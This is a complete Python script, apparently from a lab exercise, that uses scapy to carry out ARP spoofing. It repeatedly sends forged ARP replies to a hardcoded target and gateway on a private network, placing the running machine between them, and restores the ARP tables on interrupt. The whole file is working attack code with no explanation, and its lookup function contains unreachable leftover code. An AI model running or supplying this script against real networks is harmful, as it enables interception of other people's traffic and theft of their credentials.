#!/usr/bin/env python

import scapy.all as scapy
import time


def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestBroadcast = broadcast / arpRequest
    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]

    return answeredList[0][1].hwsrc
    clientList = []
    for element in answeredList:
        clientDict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clientList.append(clientDict)
    return clientList


def spoof(targetIp, spoofIp):
    targetmac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetmac, psrc=spoofIp)
    scapy.send(packet, count=4, verbose=False)


def restore(destIp, srcIp):
    destMac = getMac(destIp)
    source = getMac(srcIp)
    packetRestore = scapy.ARP(op=2, pdst=destIp, hwdst=destMac, psrc=srcIp, hwsrc=source)
    scapy.send(packetRestore, verbose=False)


targetIp = "192.168.118.157"
gatewayIp = "192.168.118.2"


try:
    sendPackets = 0
    while True:
        sendPackets = sendPackets + 2
        print("\r[+] Packets sent: " + str(sendPackets), end="")
        spoof(targetIp, gatewayIp)
        spoof(gatewayIp, targetIp)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Stopped sending packets .... Resetting ARP tables .... Please wait\n")
    restore(targetIp, gatewayIp)
    restore(gatewayIp, targetIp)
